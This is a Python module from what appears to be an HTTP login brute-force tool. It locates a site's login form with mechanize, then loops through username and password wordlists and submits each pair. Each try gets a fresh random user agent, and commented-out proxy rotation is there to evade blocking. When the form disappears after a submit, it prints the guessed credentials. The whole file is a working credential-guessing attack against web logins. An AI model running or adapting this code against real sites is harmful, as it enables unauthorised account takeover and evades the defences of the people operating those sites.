### REWRITE httpbrute
## NO oop

import mechanize, sys
from core import utils, actions

def actionGatherFormInfo(optionURL):
	######################################
	#	Test connect to URL
	#	Fetch login field
	#	TODO print ONLY ONE status message
	#
	#####################################


	try:
		process = actions.createBrowserObject()
		user_agent = actions.getUserAgent()
		process.addheaders = [('User-Agent', user_agent)]
		process.open(optionURL)
		#utils.printf("Connected. Getting form information...", "good")
		formLoginID, formUserfield, formPasswdfield = actions.getFormInformation(process.forms())
		#utils.printf("Found login form", "good")
		process.close()
		return formLoginID, formUserfield, formPasswdfield
	except TypeError:
		#utils.printf("Can not find login form", "bad")
		#sys.exit(1)
		utils.die("Can not find login form", TypeError)
		
	except Exception as error:
		#utils.printf(error, "bad")
		utils.die("Checking connection error", error)
	
	finally:
		process.close()



def handle(optionURL, optionUserlist, optionPasslist, sizePasslist, setProxyConnect = False):
	############################################
	#	Old code logic:
	#		Create 1 browser object per password
	#	Current:
	#		Create 1 browser object per username
	#		Pick 1 user agent per password try
	#
	############################################


	#	Get login form field informations
	frmLoginID, frmUserfield, frmPassfield = actionGatherFormInfo(optionURL)

	#	Get single Username in username list / file
	for tryUsername in optionUserlist:
		#	If tryUsername is file object, remove \n
		#	tryUsername = tryUsername[:-1]
		tryUsername = tryUsername.replace('\n', '')
		try:
			optionPasslist.seek(0)
		except:
			pass

		######	new test code block
		proc = actions.createBrowserObject()
		# proc = mechanize.Browser()
		# proc.set_handle_robots(False)
		######

		idxTry = 0
		for tryPassword in optionPasslist:
			#	Get single Password, remove \n
			tryPassword = tryPassword.replace('\n', '')

			#	New test code block: add new user_agent each try
			user_agent = actions.getUserAgent()
			proc.addheaders = [('User-Agent', user_agent)]
			# if setProxyConnect == True:
			# 	#Set proxy connect
			# 	proxyAddr = actions.getProxyAddr()
			# 	#utils.printf("Debug: proxy addr %s" %(proxyAddr))
			# 	proc.set_proxies({"http": proxyAddr})

			proc.open(optionURL)
			#	End new code block

			########	Old good code block
			# proc = mechanize.Browser()
			# user_agent = actions.getUserAgent()
			# proc.addheaders = [('User-Agent', user_agent)]
			# proc.set_handle_robots(False)
			# proc.open(optionURL)
			########	End good code block

			try:
				idxTry += 1

				#	Select login form
				proc.select_form(nr = frmLoginID)
				proc.form[frmUserfield] = tryUsername
				proc.form[frmPassfield] = tryPassword

				#	Print status bar
				utils.printp(tryUsername, idxTry, sizePasslist)

				#	Send request
				proc.submit()

				#	Reload - useful for redirect to dashboard
				proc.reload()

				#	If no login form -> success
				#	TODO improve condition to use captcha
				if not actions.getFormInformation(proc.forms()):
					utils.printf(
						"Found: %s:%s\n" %(
							tryUsername,
							tryPassword
							),
						"good"
					)

					#	Clear object and try new username
					proc.close()
					break

			except mechanize.HTTPError as error:
				#	Get blocked
				utils.die("Thread has been blocked", error)

		proc.close()